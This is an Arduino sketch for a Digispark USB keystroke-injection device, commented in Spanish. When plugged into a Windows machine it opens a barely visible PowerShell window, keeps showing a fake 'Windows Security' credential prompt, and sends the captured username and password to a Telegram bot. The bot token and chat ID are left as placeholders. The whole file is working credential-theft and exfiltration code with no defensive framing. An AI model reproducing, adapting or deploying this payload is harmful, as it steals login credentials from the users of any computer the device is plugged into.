#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  // Abrir Ejecutar
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Abrir PowerShell con ventana MUY pequeña
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=15 lines=1\"");
  DigiKeyboard.delay(2000);

  // Setup, bucle y captura de credenciales
  DigiKeyboard.println(F("Add-Type -AssemblyName System.DirectoryServices.AccountManagement; do {$cred=$host.ui.PromptForCredential('Windows Security','Enter credentials','','');if($cred){$net=$cred.GetNetworkCredential();$user=$net.username;$pass=$net.password;"));
  DigiKeyboard.delay(300);
  
  // Envío a Telegram y cierre
  DigiKeyboard.println(F("$token='SIN_TOKEN';$chat='SIN_ID';$msg='U:'+$user+' P:'+$pass;try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$token+'/sendMessage') -Method Post -Body @{chat_id=$chat;text=$msg};exit}catch{}}}while($true)"));
  DigiKeyboard.delay(300);
  
  DigiKeyboard.println();
  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(60000);
  digitalWrite(1, LOW);
}